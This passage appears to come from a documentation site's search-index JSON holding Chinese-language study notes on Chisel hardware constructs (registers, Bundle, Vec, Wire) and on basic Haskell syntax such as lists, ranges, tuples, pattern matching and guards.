\u9664\u548c\u53d6\u6a21\uff0c\u7ed3\u679c\u7684\u4f4d\u5bbd\u4e00\u822c\u662f\u7b2c\u4e00\u4e2a\u64cd\u4f5c\u6570\u7684\u4f4d\u5bbd</li> </ul> </li> <li>\u53ef\u4ee5\u5148\u901a\u8fc7 val \u5b9a\u4e49\u4e00\u4e2a Wire \u53d8\u91cf\uff0c\u7136\u540e\u901a\u8fc7 := \u64cd\u4f5c\u7b26\u6765\u66f4\u65b0\u8d4b\u503c     <pre><code>val w = Wire(Uint())\nw := a &amp; b\n</code></pre></li> <li>\u5176\u4ed6\u5185\u7f6e\u786c\u4ef6\u51fd\u6570\uff0c\u4e0b\u4e2d v\u3001a\u3001b \u5747\u8868\u793a\u53d8\u91cf\uff0c\u53ef\u4ee5\u662f UInt \u548c SInt<ul> <li>v.andR v.orR v.xorR \u89c4\u7ea6\u64cd\u4f5c\uff0c\u5373\u5bf9\u6240\u6709\u4f4d\u4f9d\u6b21\u8fdb\u884c\u4f4d\u8fd0\u7b97</li> <li>v(n) \u63d0\u53d6 v \u7684\u67d0\u4e00\u4f4d\uff08\u6700\u53f3\u4e00\u4f4d\u4e3a 0 \u53f7\uff09</li> <li>v(end, start) \u63d0\u8d77 v \u7684 [end:start] \u4f4d</li> <li>a ## b\uff0c\u5c06 b \u63a5\u5728 a \u540e\u9762\uff08\u5373 a \u5728\u9ad8\u4f4d\uff09\uff0c\u4e5f\u53ef\u5199\u4e3a Cat(a, b, ...)</li> </ul> </li> <li>\u591a\u8def\u9009\u62e9\u5668<ul> <li><code>val result = Mux(sel, a, b)</code></li> <li>sel \u4e3a true.B \u65f6\u7ed3\u679c\u4e3a a\uff0c\u5426\u5219\u4e3a b</li> <li>a \u548c b \u53ef\u4ee5\u662f\u4efb\u610f Chisel \u7c7b\u578b\uff0c\u4f46\u8981\u4fdd\u8bc1\u4e8c\u8005\u76f8\u540c</li> </ul> </li> </ul>"},{"location":"cs/pl/chisel/#_6","title":"\u5bc4\u5b58\u5668","text":"<ul> <li>Chisel \u5185\u7f6e\u63d0\u4f9b\u4e86\u5bc4\u5b58\u5668\uff0c\u5177\u4f53\u5b9e\u73b0\u4e3a D \u9501\u5b58\u5668</li> <li>\u5bc4\u5b58\u5668\u4f1a\u9690\u5f0f\u8fde\u63a5\u5230\u4e00\u4e2a\u5168\u5c40\u7684 clock \u548c reset \u4e0a\uff0c\u5f53 clock \u5230\u8fbe\u4e0a\u5347\u6cbf\u5219\u66f4\u65b0</li> <li>\u51e0\u79cd\u5bc4\u5b58\u5668<ul> <li>\u666e\u901a Reg<ul> <li>Reg(t, next, init)<ul> <li>t \u8868\u793a\u5bc4\u5b58\u5668\u6570\u636e\u7c7b\u578b</li> <li>next \u662f\u6570\u636e\u7684\u8f93\u5165\u7aef\uff0c\u4e5f\u662f\u5bc4\u5b58\u5668\u5ef6\u8fdf\u4e00\u4e2a\u5468\u671f\u7684\u8f93\u51fa\uff08\u8ddf\u968f\u7684\u53d8\u91cf\uff09</li> <li>init \u662f\u590d\u4f4d\u65f6\u7684\u8f93\u51fa</li> </ul> </li> <li>\u4f7f\u7528\u4e0a\u53ef\u4ee5\u76f4\u63a5 <code>val reg = Reg(UInt(8.W))</code>\uff0c\u8fd9\u6837\u5c31\u4f1a\u81ea\u52a8\u8fde\u63a5\u5230\u5168\u5c40\u7684 clock \u548c reset \u4e0a<ul> <li>\u53ef\u4ee5\u901a\u8fc7 <code>reg := next</code> \u6765\u66f4\u65b0 </li> <li>\u53ef\u4ee5\u901a\u8fc7 <code>val out = reg</code> \u6765\u8bfb\u53d6</li> </ul> </li> </ul> </li> <li>RegNext<ul> <li>RegNext(next)<ul> <li>\u5728\u6bcf\u4e2a\u4e0a\u5347\u6cbf\u90fd\u4f1a\u5c06\u503c\u66f4\u65b0\u4e3a\u8ddf\u968f\u7684\u53d8\u91cf\u503c\uff0c\u8ddf\u968f\u53d8\u91cf\u521d\u59cb\u4e3a next\uff0c\u540e\u7eed\u8fdb\u884c\u8d4b\u503c\u540e\u5219\u8ddf\u968f\u65b0\u7684\u53d8\u91cf</li> <li>\u6bd4\u5982 <code>val reg = RegNext(a)</code> \u5219\u4f1a\u8f6c\u5316\u4e3a\u5982\u4e0b verilog \u4ee3\u7801\uff1a     <pre><code>always @(posedge clock) begin\n    reg &lt;= a;\nend\n</code></pre></li> </ul> </li> <li>RegNext(next, init)<ul> <li>\u5e26\u6709\u590d\u4f4d\u503c <pre><code>always @(posedge clock) begin\n    if (reset) begin\n        reg &lt;= init;\n    end else begin\n        reg &lt;= next;\n    end\nend\n</code></pre></li> </ul> </li> </ul> </li> <li>RegInit \u5373\u5e26\u6709\u521d\u59cb\u503c\uff0c\u53ef\u4ee5\u4e0d\u7528\u663e\u793a\u8d4b\u503c\u5c31\u5f00\u59cb\u4f7f\u7528</li> <li>RegEnable(next, init, enable)\uff0c\u5e26\u4e00\u4e2a\u4f7f\u80fd\u7aef\uff0c\u53ea\u6709 enable \u4e3a true.B \u65f6\u624d\u4f1a\u66f4\u65b0</li> </ul> </li> <li>\u6bd4\u5982\u4e00\u4e2a\u4ece 0 \u5230 9 \u4e0d\u65ad\u8ba1\u6570\u7684\u5bc4\u5b58\u5668\u5c31\u53ef\u4ee5\u5199\u4e3a     <pre><code>val cntReg = RegInit(0.U(8.W))\ncntReg := Mux(cntReg === 9.U, 0.U, cntReg + 1.U)\n</code></pre></li> </ul>"},{"location":"cs/pl/chisel/#_7","title":"\u6253\u5305\u7ed3\u6784","text":"<p>Chisel \u63d0\u4f9b\u4e86\u4e24\u79cd\u5c06\u4fe1\u53f7\u6253\u5305\u7684\u7c7b\u578b\uff0c\u5206\u522b\u662f Bundle \u548c Vec\uff0c\u5206\u522b\u7c7b\u4f3c\u4e8e\u7ed3\u6784\u4f53\u548c\u6570\u7ec4\u3002\u540c\u65f6\u5b83\u4eec\u53ef\u4ee5\u521b\u5efa\u65b0\u7684 Chisel \u7c7b\u578b\u5e76\u4e14\u53ef\u4ee5\u5d4c\u5957\u3002</p>"},{"location":"cs/pl/chisel/#bundle","title":"Bundle","text":"<ul> <li>\u7c7b\u4f3c\u4e8e C \u4e2d\u7684\u7ed3\u6784\u4f53\uff0c\u53ef\u4ee5\u5c06\u4e0d\u540c\u7c7b\u578b\u7684\u4fe1\u53f7\u5305\u88f9\u8d77\u6765\u5e76\u4e14\u547d\u540d</li> <li>\u901a\u8fc7 class \u5e76\u7ee7\u627f Bundle \u6765\u521b\u5efa\u4e00\u4e2a\u65b0\u7684 Bundle \u7c7b\u578b\uff1a     <pre><code>class Channel extends Bundle {\n    val data = UInt(32.W)\n    val valid = Bool()\n}\n</code></pre></li> <li>\u901a\u8fc7 new \u6765\u521b\u5efa\u7136\u540e\u5305\u88c5\u5728 Wire \u4e2d\u4f7f\u7528\uff1a     <pre><code>val ch = Wire(new Channel())\nch.data := 123.U\nch.valid := true.B\nval b = ch.valid\nval channel = ch\n</code></pre></li> </ul>"},{"location":"cs/pl/chisel/#vec","title":"Vec","text":"<ul> <li>\u7c7b\u4f3c\u4e8e C \u4e2d\u7684\u6570\u7ec4\uff0c\u53ef\u4ee5\u5c06\u76f8\u540c\u7c7b\u578b\u7684\u4fe1\u53f7\u6253\u5305\u6210\u6570\u7ec4</li> <li>Vec \u4e00\u822c\u6709\u51e0\u79cd\u7528\u9014<ul> <li>\u786c\u4ef6\u4e2d\u7684\u52a8\u6001\u5bfb\u5740\uff0c\u53ef\u4ee5\u7528\u4f5c\u591a\u8def\u9009\u62e9\u5668</li> <li>\u53ef\u4ee5\u7528\u6765\u6784\u5efa\u5bc4\u5b58\u5668\u7ec4</li> <li>\u7ec4\u5408 Module \u7684\u63a5\u53e3</li> <li>\u5176\u4ed6\u7528\u9014\u63a8\u8350\u4f7f\u7528 Seq</li> </ul> </li> <li>\u7ec4\u5408\u903b\u8f91\u4e2d\u7684 Vec<ul> <li>\u4f7f\u7528 Vec \u521b\u5efa\u540e\u5305\u88f9\u5728 Wire \u4e2d</li> <li>Vec \u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a\u5143\u7d20\u4e2a\u6570\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e3a\u5143\u7d20\u7c7b\u578b <pre><code>val v = Wire(Vec(3, UInt(4.W)))\nv(0) := x\nv(1) := y\nv(2) := z\nval muxOut = vec(select)\n</code></pre></li> <li>\u53ef\u4ee5\u4f7f\u7528 VecInit \u6765\u521b\u5efa\u6709\u521d\u59cb\u503c\u7684 Vec<ul> <li>\u6b64\u65f6\u4e0d\u9700\u8981\u5305\u88f9\u5728 Wire \u4e2d\uff0c\u56e0\u4e3a\u5b83\u5df2\u7ecf\u662f\u4e00\u4e2a Chisel \u786c\u4ef6\u7c7b\u578b\u4e86 <pre><code>val defVecSig = VecInit(d, e, f)\nval vecOutSig = defVecSig(select)\n</code></pre></li> </ul> </li> </ul> </li> <li>\u5bc4\u5b58\u5668\u7ec4<ul> <li>\u4f7f\u7528 Vec \u521b\u5efa\u540e\u5305\u88f9\u5728 Reg \u4e2d</li> <li>\u7528\u6cd5\u548c\u524d\u9762\u7c7b\u4f3c\uff0c\u53ea\u662f\u884c\u4e3a\u548c\u5bc4\u5b58\u5668\u76f8\u540c\u800c\u4e0d\u662f wire</li> <li>\u6bd4\u5982\u53ef\u4ee5\u4f7f\u7528 <code>val registerFile = Reg(Vec(32, UInt(32.W)))</code> \u6765\u521b\u5efa\u4e00\u4e2a 32 \u4e2a 32 \u4f4d\u5bc4\u5b58\u5668\u7684\u5bc4\u5b58\u5668\u7ec4</li> <li>\u53ef\u4ee5\u7ed3\u5408 RegInit \u548c VecInit \u521b\u5efa\u5e26\u521d\u59cb\u5316\u503c\u7684\u5bc4\u5b58\u5668\u7ec4     <pre><code>val initReg = RegInit(VecInit(Seq.fill(32)(0.U(32.W))))\n</code></pre></li> </ul> </li> </ul>"},{"location":"cs/pl/chisel/#_8","title":"\u786c\u4ef6\u7c7b\u578b","text":"<ul> <li>UInt\u3001SInt\u3001Bits \u90fd\u662f Chisel \u7684\u6570\u636e\u7c7b\u578b\uff0c\u5b83\u4eec\u4e0d\u8868\u793a\u4efb\u4f55\u786c\u4ef6\u7ed3\u6784</li> <li>\u5c06\u5b83\u4eec\u5305\u88c5\u8fdb Wire\u3001Reg\u3001IO \u7b49\u624d\u4f1a\u751f\u6210\u786c\u4ef6<ul> <li>Wire \u8868\u793a\u7ec4\u5408\u903b\u8f91</li> <li>Reg \u8868\u793a\u5bc4\u5b58\u5668\uff08\u7531 D \u9501\u5b58\u5668\u6784\u6210\uff09</li> <li>IO \u8868\u793a\u4e00\u4e2a module \u7684\u63a5\u53e3</li> </ul> </li> <li>\u4efb\u4f55 Chisel \u6570\u636e\u7c7b\u578b\u90fd\u53ef\u4ee5\u5305\u88c5\u8fdb Wire\u3001Reg\u3001IO</li> <li>\u901a\u8fc7 <code>val number = Wire(UInt())</code> \u521b\u5efa\u4e00\u4e2a\u4e0d\u53ef\u53d8\u7684 scala \u53d8\u91cf<ul> <li>\u540e\u7eed\u901a\u8fc7 := \u64cd\u4f5c\u7b26\u6765\u66f4\u65b0\u503c\uff0c\u4f46\u4e0d\u53ef\u4f7f\u7528 =<ul> <li>= \u662f Scala \u7684\u8d4b\u503c\u64cd\u4f5c\u7b26\uff0c\u7528\u6765\u521b\u5efa\u786c\u4ef6</li> <li>:= \u662f Chisel \u7684\u8d4b\u503c\u64cd\u4f5c\u7b26\uff0c\u7528\u6765\u7ed9\u5df2\u7ecf\u5b58\u5728\u7684\u786c\u4ef6\uff08\u91cd\u65b0\uff09\u8d4b\u503c</li> </ul> </li> </ul> </li> <li>\u53ef\u4ee5\u901a\u8fc7 WireDefault \u6765\u521b\u5efa\u5e26\u6709\u521d\u59cb\u503c\u7684 Wire     <pre><code>val number = Wire(UInt())\nnumber := 10.U\n// \u7b49\u4ef7\u4e8e\nval number = WireDefault(10.U(4.W))\n</code></pre></li> </ul>"},{"location":"cs/pl/haskell/","title":"Haskell","text":"<p> \u7ea6 17415 \u4e2a\u5b57  1171 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 73 \u5206\u949f</p> <p>Haskell \u662f\u4e00\u79cd\u6807\u51c6\u5316\u7684\uff0c\u901a\u7528\u7684\u7eaf\u51fd\u6570\u5f0f\u7f16\u7a0b\u8bed\u8a00\uff0c\u6709\u60f0\u6027\u6c42\u503c\u548c\u5f3a\u9759\u6001\u7c7b\u578b\u3002\u5b83\u7684\u547d\u540d\u6e90\u81ea\u7f8e\u56fd\u903b\u8f91\u5b66\u5bb6\u54c8\u65af\u51ef\u5c14\u00b7\u52a0\u91cc\uff0c\u4ed6\u5728\u6570\u7406\u903b\u8f91\u65b9\u9762\u4e0a\u7684\u5de5\u4f5c\u4f7f\u5f97\u51fd\u6570\u5f0f\u7f16\u7a0b\u8bed\u8a00\u6709\u4e86\u5e7f\u6cdb\u7684\u57fa\u7840\u3002\u5728 Haskell \u4e2d\uff0c\u201c\u51fd\u6570\u662f\u7b2c\u4e00\u7c7b\u5bf9\u8c61\u201d\u3002\u4f5c\u4e3a\u4e00\u95e8\u51fd\u6570\u7f16\u7a0b\u8bed\u8a00\uff0c\u4e3b\u8981\u63a7\u5236\u7ed3\u6784\u662f\u51fd\u6570\u3002Haskell \u8bed\u8a00\u662f1990\u5e74\u5728\u7f16\u7a0b\u8bed\u8a00 Miranda \u7684\u57fa\u7840\u4e0a\u6807\u51c6\u5316\u7684\uff0c\u5e76\u4e14\u4ee5\u03bb\u6f14\u7b97\u4e3a\u57fa\u7840\u53d1\u5c55\u800c\u6765\u3002\u8fd9\u4e5f\u662f\u4e3a\u4ec0\u4e48 Haskell \u8bed\u8a00\u4ee5\u5e0c\u814a\u5b57\u6bcd \u201c\u03bb\u201d\uff08Lambda\uff09\u4f5c\u4e3a\u81ea\u5df1\u7684\u6807\u5fd7\u3002Haskell \u5177\u6709\u201c\u8bc1\u660e\u5373\u7a0b\u5e8f\u3001\u547d\u9898\u4e3a\u7c7b\u578b\u201d\u7684\u7279\u5f81\u3002 \u2014\u2014\u2014\u2014 \u7ef4\u57fa\u767e\u79d1</p>"},{"location":"cs/pl/haskell/#_1","title":"\u57fa\u7840\u8fd0\u7b97","text":"<ul> <li><code>+ - * / ()</code>\uff1a\u52a0\u51cf\u4e58\u9664</li> <li><code>div</code>\uff1a\u6574\u9664</li> <li><code>mod</code>\uff1a\u53d6\u6a21</li> <li><code>True False</code>\uff1a\u5e03\u5c14\u503c</li> <li><code>|| &amp;&amp; not</code>\uff1a\u6216\u4e14\u975e</li> <li><code>==</code>\uff1a\u6761\u4ef6\u5224\u65ad\uff0c\u76f8\u7b49</li> <li><code>/=</code>\uff1a\u6761\u4ef6\u5224\u65ad\uff0c\u4e0d\u7b49</li> </ul>"},{"location":"cs/pl/haskell/#_2","title":"\u51fd\u6570\u8c03\u7528","text":"<p>Haskell \u4e2d\u8c03\u7528\u51fd\u6570\u4e0d\u52a0\u62ec\u53f7\uff0c\u5148\u5199\u51fa\u51fd\u6570\u540d\uff0c\u7136\u540e\u9010\u4e2a\u5217\u51fa\u53c2\u6570\uff0c\u7528\u7a7a\u683c\u9694\u5f00\uff1a <pre><code>ghci&gt; max 1 2\n2\n</code></pre> \u524d\u7f00\uff08prefix\uff09\u51fd\u6570\u4e0e\u4e2d\u7f00\uff08infix\uff09\u51fd\u6570\u8f6c\u6362\uff1a</p> <ul> <li>\u5bf9\u524d\u7f00\u51fd\u6570\u52a0<code>``</code>\u4f7f\u5176\u53d8\u6210\u4e2d\u7f00\u51fd\u6570</li> <li>\u5bf9\u4e2d\u7f00\u51fd\u6570\u52a0<code>()</code>\u4f7f\u5176\u53d8\u6210\u524d\u7f00\u51fd\u6570</li> </ul> <pre><code>ghci&gt; 4 `div` 2\n2\nghci&gt; 1 `max` 2\n2\nghci&gt; (+) 1 2\n3\nghci&gt; (||) True False\nTrue\n</code></pre>"},{"location":"cs/pl/haskell/#list","title":"List","text":"<p>\u5217\u8868\u662f Haskell \u4e2d\u5f88\u5e38\u89c1\u7684\u6570\u636e\u7c7b\u578b\uff0c\u548c Python \u4e2d\u4e0d\u540c\uff0cHaskell \u4e2d\u7684\u5217\u8868\u4e2d\u7684\u6240\u6709\u5143\u7d20\u5fc5\u987b\u662f\u540c\u4e00\u4e2a\u7c7b\u578b\u3002</p> <p>\u4ee5\u4e0b\u662f\u5217\u8868\u5e38\u7528\u7684\u51fd\u6570\uff1a</p> <ul> <li><code>(++)</code> :: [a] -&gt; [a] -&gt; [a]\uff1a\u5408\u5e76\u4e24\u4e2a\u5217\u8868</li> <li><code>(:)</code> :: a -&gt; [a] -&gt; [a]\uff1a\u5c06\u5355\u4e2a\u5143\u7d20\u5e76\u5165\u5217\u8868\u3002[1, 2, 3] \u662f 1:2:3:[] \u7684\u8bed\u6cd5\u7cd6</li> <li><code>(!!)</code> :: [a] -&gt; Int -&gt; a\uff1a\u901a\u8fc7\u7d22\u5f15\u53d6\u51fa\u67d0\u4e2a\u4f4d\u7f6e\u4e0a\u7684\u5143\u7d20\u3002a !! 1 \u76f8\u5f53\u4e8e Python \u4e2d\u7684 a[1]</li> <li><code>head</code> :: [a] -&gt; a\uff1a\u8fd4\u56de\u5217\u8868\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20</li> <li><code>tail</code> :: [a] -&gt; [a]\uff1a\u8fd4\u56de\u5217\u8868\u4e2d\u9664\u53bb\u7b2c\u4e00\u4e2a\u5143\u7d20\u540e\u7684\u5217\u8868\uff08\u82e5\u53ea\u6709\u4e00\u4e2a\u5143\u7d20\u5219\u8fd4\u56de\u7a7a\u5217\u8868[]\uff09</li> <li><code>last</code> :: [a] -&gt; a\uff1a\u8fd4\u56de\u5217\u8868\u4e2d\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20</li> <li><code>init</code> :: [a] -&gt; [a]\uff1a\u8fd4\u56de\u5217\u8868\u4e2d\u9664\u53bb\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u540e\u7684\u5217\u8868</li> <li><code>length</code> :: Foldable t =&gt; t a -&gt; Int\uff1a\u8fd4\u56de\u5217\u8868\u7684\u957f\u5ea6</li> <li><code>null</code> :: Foldable t =&gt; t a -&gt; Bool\uff1a\u8fd4\u56de\u5217\u8868\u662f\u5426\u4e3a\u7a7a</li> <li><code>reverse</code> :: [a] -&gt; [a]\uff1a\u8fd4\u56de\u7ffb\u8f6c\u540e\u7684\u5217\u8868</li> <li><code>take</code> :: Int -&gt; [a] -&gt; [a]\uff1a\u8fd4\u56de\u5217\u8868a\u7684\u524dn\u4e2a\u5143\u7d20\u7684\u5217\u8868(take n a)</li> <li><code>drop</code> :: Int -&gt; [a] -&gt; [a]\uff1a\u8fd4\u56de\u5217\u8868a\u4e2d\u9664\u53bb\u524dn\u4e2a\u5143\u7d20\u540e\u7684\u5217\u8868(drop n a)</li> <li><code>maximum</code> :: (Foldable t, Ord a) =&gt; t a -&gt; a\uff1a\u8fd4\u56de\u5217\u8868\u4e2d\u7684\u6700\u5927\u503c</li> <li><code>minimum</code> :: (Foldable t, Ord a) =&gt; t a -&gt; a\uff1a\u8fd4\u56de\u5217\u8868\u4e2d\u7684\u6700\u5c0f\u503c</li> <li><code>sum</code> :: (Foldable t, Num a) =&gt; t a -&gt; a\uff1a\u8fd4\u56de\u5217\u8868\u4e2d\u6240\u6709\u5143\u7d20\u7684\u548c</li> <li><code>product</code> :: (Foldable t, Num a) =&gt; t a -&gt; a\uff1a\u8fd4\u56de\u5217\u8868\u4e2d\u6240\u6709\u5143\u7d20\u7684\u79ef</li> <li><code>elem</code> :: (Foldable t, Eq a) =&gt; t a -&gt; Bool\uff1a\u5224\u65ad\u503cn\u662f\u5426\u5728\u5217\u8868a\u4e2d     <pre><code>elem n a\n-- \u6216\nn `elem` a --\u7528``\u5305\u4e0a\u53ef\u4ee5\u53d8\u6210\u4e2d\u7f00\u51fd\u6570\u4f7f\u7528\n</code></pre></li> </ul>"},{"location":"cs/pl/haskell/#texas-ranges","title":"Texas ranges","text":"<p>\u4f7f\u7528<code>..</code>\u53ef\u4ee5\u8868\u793a\u51fa\u8303\u56f4\u5e76\u81ea\u52a8\u63a8\u5bfc\uff1a <pre><code>ghci&gt; [1 .. 10]  \n[1,2,3,4,5,6,7,8,9,10]  \nghci&gt; ['a' .. 'z']  \n\"abcdefghijklmnopqrstuvwxyz\"  \nghci&gt; ['K' .. 'Z']  \n\"KLMNOPQRSTUVWXYZ\" \nghci&gt; [2, 4 .. 20]  \n[2,4,6,8,10,12,14,16,18,20]  \nghci&gt; [3, 6 .. 20]  \n[3,6,9,12,15,18]\nghci&gt; [5, 4 .. 1]\n[5,4,3,2,1]\n</code></pre> \u4e5f\u53ef\u4ee5\u7528\u6765\u751f\u6210\u65e0\u7a77\u5217\u8868\uff0c\u5982 [1..]\u3001[1, 3..]\u3002\u540c\u65f6\u4e5f\u6709\u51fd\u6570\u53ef\u4ee5\u751f\u6210\u65e0\u7a77\u5217\u8868\uff1a</p> <ul> <li><code>cycle</code> :: [a] -&gt; [a]\uff1a\u5c06\u539f\u5217\u8868\u4e0d\u65ad\u5faa\u73af\u751f\u6210\u65e0\u7a77\u5217\u8868</li> <li><code>repeat</code> :: a -&gt; [a]\uff1a\u5c06\u4f20\u5165\u7684\u503c\u4e0d\u65ad\u91cd\u590d\u751f\u6210\u65e0\u7a77\u5217\u8868<ul> <li><code>replicate</code> :: Int -&gt; a -&gt; [a]\uff1a\u5c06\u503ca\u91cd\u590dn\u6b21\uff0c\u8fd4\u56de\u751f\u6210\u7684\u5217\u8868(replicate n a)</li> </ul> </li> </ul>"},{"location":"cs/pl/haskell/#list-comprehension","title":"List comprehension","text":"<p>Haskell \u4e2d\u4e5f\u6709\u5217\u8868\u63a8\u5bfc\uff0c\u5f62\u5f0f\u662f\u4e00\u4e2a\u4e2d\u62ec\u53f7\uff0c\u5de6\u4fa7\u4e3a\u8868\u8fbe\u5f0f\uff0c\u53f3\u4fa7\u4e3a\u53d8\u91cf\u7684\u8303\u56f4\u548c\u7ea6\u675f\u6761\u4ef6 <pre><code>ghci&gt; [x * 2 | x &lt;- [1 .. 10]]  \n[2,4,6,8,10,12,14,16,18,20]  \nghci&gt; [x * 2 | x &lt;- [1 .. 10], x * 2 &gt;= 12]  \n[12,14,16,18,20]\nghci&gt; [ x | x &lt;- [50 .. 100], x `mod` 7 == 3]  \n[52,59,66,73,80,87,94]   \nghci&gt; [x * y | x &lt;- [2, 5, 10], y &lt;- [8, 10, 11]]  \n[16,20,22,40,50,55,80,100,110]\n</code></pre></p>"},{"location":"cs/pl/haskell/#tuple","title":"Tuple","text":"<p>Haskell\u4e2d\u7684\u5143\u7ec4\u53ef\u4ee5\u6709\u4e0d\u540c\u957f\u5ea6\uff0c\u5143\u7d20\u53ef\u4ee5\u6709\u4e0d\u540c\u7c7b\u578b\u3002\u5e76\u4e14\u4e00\u4e2a\u5143\u7ec4\u7684\u7c7b\u578b\u7531\u5176\u4e2d\u6240\u6709\u5143\u7d20\u7684\u7c7b\u578b\u5171\u540c\u51b3\u5b9a\u3002\u5b83\u7684\u5e38\u7528\u51fd\u6570\uff1a</p> <ul> <li><code>fst</code> :: (a, b) -&gt; a\uff1a\u8fd4\u56de\u542b\u6709\u4e24\u4e2a\u5143\u7d20\u5143\u7ec4\u4e2d\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20</li> <li><code>snd</code> :: (a, b) -&gt; b\uff1a\u8fd4\u56de\u542b\u6709\u4e24\u4e2a\u5143\u7d20\u5143\u7ec4\u4e2d\u7684\u7b2c\u4e8c\u4e2a\u5143\u7d20</li> <li><code>zip</code> :: [a] -&gt; [b] -&gt; [(a, b)]\uff1a\u63a5\u6536\u4e24\u4e2a\u5217\u8868\uff0c\u8fd4\u56de\u4e00\u4e2a\u5217\u8868\uff0c\u6bcf\u4e2a\u5143\u7d20\u662f\u4f9d\u6b21\u5c06\u4e24\u4e2a\u5217\u8868\u4e2d\u5143\u7d20\u914d\u5bf9\u6210\u7684\u4e8c\u5143\u7ec4</li> </ul>"},{"location":"cs/pl/haskell/#syntax-in-functions","title":"Syntax in Functions","text":"<p>\u51fd\u6570\u53ef\u4ee5\u76f4\u63a5\u5b9a\u4e49\uff1a <pre><code>plus x y = x + y\n</code></pre> \u8fd9\u65f6Haskell\u4f1a\u81ea\u52a8\u63a8\u65ad\u51fd\u6570\u7684\u7c7b\u578b\u4e3a(Num a) =&gt; a -&gt; a -&gt; a\u3002\u4f46\u662f\u6700\u597d\u5728\u5b9a\u4e49\u51fd\u6570\u524d\u58f0\u660e\u51fd\u6570\u7684\u7c7b\u578b\uff1a <pre><code>plus :: (Num a) =&gt; a -&gt; a -&gt; a\nplus x y = x + y\n</code></pre></p>"},{"location":"cs/pl/haskell/#pattern-matching","title":"Pattern matching","text":"<p>\u5b9a\u4e49\u51fd\u6570\u65f6\u53ef\u4ee5\u4f7f\u7528\u6a21\u5f0f\u5339\u914d\u8bed\u6cd5\u3002\u8fd0\u884c\u65f6\u4f9d\u6b21\u5c06\u8f93\u5165\u4e0e\u7ed9\u51fa\u7684\u6a21\u5f0f\u76f8\u5339\u914d\uff0c\u5982\u679c\u5339\u914d\uff0c\u5c31\u6267\u884c\u5bf9\u5e94\u64cd\u4f5c\uff1b\u4e0d\u5339\u914d\uff0c\u5c31\u7ee7\u7eed\u4e0e\u4e0b\u4e00\u4e2a\u6a21\u5f0f\u76f8\u5339\u914d\uff0c\u76f4\u5230\u5339\u914d\u6210\u529f\uff0c\u4e5f\u56e0\u6b64\uff0c\u6700\u540e\u5fc5\u987b\u8981\u7ed9\u51fa\u4e00\u79cd\u901a\u7528\u7684\u5339\u914d\u6765\u63a5\u6536\u4e0e\u7ed9\u51fa\u6a21\u5f0f\u5168\u4e0d\u5339\u914d\u7684\u8f93\u5165\u3002\u5982\uff1a <pre><code>factorial :: (Integral a) =&gt; a -&gt; a  \nfactorial 0 = 1  \nfactorial n = n * factorial (n - 1)  \n</code></pre> <pre><code>first :: (a, b, c) -&gt; a  \nfirst (x, _, _) = x  \n\nsecond :: (a, b, c) -&gt; b  \nsecond (_, y, _) = y  \n\nthird :: (a, b, c) -&gt; c  \nthird (_, _, z) = z  \n</code></pre> \u5176\u4e2d <code>_</code> \u8868\u793a\u4efb\u4f55\u503c\uff0c\u4e14\u4e0d\u5173\u5fc3\u5b83\u7684\u5185\u5bb9\uff0c\u53ea\u662f\u7528\u6765\u5360\u4f4d</p> <p>\u5217\u8868\u7684 (:) \u64cd\u4f5c\u4e5f\u53ef\u4ee5\u7528\u6765\u8fdb\u884c\u6a21\u5f0f\u5339\u914d\uff1a <pre><code>head' :: [a] -&gt; a  \nhead' [] = error \"Can't call head on an empty list, dummy!\"  \nhead' (x:_) = x\n\nsum' :: (Num a) =&gt; [a] -&gt; a  \nsum' [] = 0  \nsum' (x:xs) = x + sum' xs  \n</code></pre> \u4f46 (++) \u64cd\u4f5c\u4e0d\u53ef\u4ee5\u7528\u6765\u6a21\u5f0f\u5339\u914d</p> <p>\u5728\u9488\u5bf9\u5217\u8868\u8fdb\u884c\u6a21\u5f0f\u5339\u914d\u65f6\uff0c\u5982\u679c\u540c\u65f6\u9700\u8981\u6574\u4e2a\u5217\u8868\u3001\u5217\u8868\u7684\u7b2c\u4e00\u4e2a\u503c\u3001\u5217\u8868\u9664\u7b2c\u4e00\u4e2a\u503c\u5916\u7684\u5185\u5bb9\uff0c\u53ef\u4ee5\u4f7f\u7528 <code>xs@(q:qs)</code>\u3002\u6bd4\u5982 [1, 2, 3] \u901a\u8fc7 <code>xs@(q:qs)</code> \u5339\u914d\u540e\uff0cxs \u4e3a [1, 2, 3]\uff0cq \u4e3a 1\uff0cqs \u4e3a [2, 3]</p>"},{"location":"cs/pl/haskell/#guard-syntax","title":"Guard syntax","text":"<p>\u5728\u51fd\u6570\u7684\u5b9a\u4e49\u4e2d\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u5b88\u536b\uff08guard\uff09\u8bed\u6cd5\uff1a <pre><code>max' :: (Ord a) =&gt; a -&gt; a -&gt; a  \nmax' a b   \n    | a &gt; b     = a  \n    | otherwise = b \n</code></pre> \u5148\u7ed9\u51fa\u4f20\u5165\u7684\u53c2\u6570\u53d8\u91cf\uff0c\u7136\u540e\u4e0b\u4e00\u884c\u7f29\u8fdb\u540e\u52a0 |\uff0c| \u540e\u9762\u7b49\u53f7\u524d\u8868\u793a\u8fdb\u884c\u7684\u5224\u65ad\uff0c\u5982\u679c\u4e3a True \u5219\u8fd4\u56de\u8fd9\u4e2a\u7b49\u53f7\u540e\u9762\u7684\u503c\uff1b\u5982\u679c\u4e3a False \u5219\u7ee7\u7eed\u5224\u65ad\u4e0b\u4e00\u884c\uff0c\u76f4\u5230 otherwise</p>"},{"location":"cs/pl/haskell/#case-expressions","title":"Case expressions","text":"<p>\u5728\u51fd\u6570\u7684\u5b9a\u4e49\u4e2d\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528 case \u8868\u8fbe\u5f0f\u6765\u914d\u5408\u6a21\u5f0f\u5339\u914d\u4f7f\u7528\uff1a <pre><code>case expression of pattern -&gt; result  \n                   pattern -&gt; result\n                   ...  \n</code></pre> \u4f8b\u5982\uff1a <pre><code>head' :: [a] -&gt; a  \nhead' [] = error \"No head for empty lists!\"  \nhead' (x:_) = x  \n-- \u7b49\u4ef7\u4e8e\uff1a\nhead' :: [a] -&gt; a  \nhead' xs = case xs of [] -&gt; error \"No head for empty lists!\"  \n                      (x:_) -&gt; x  \n</code></pre> <pre><code>describeList :: [a] -&gt; String  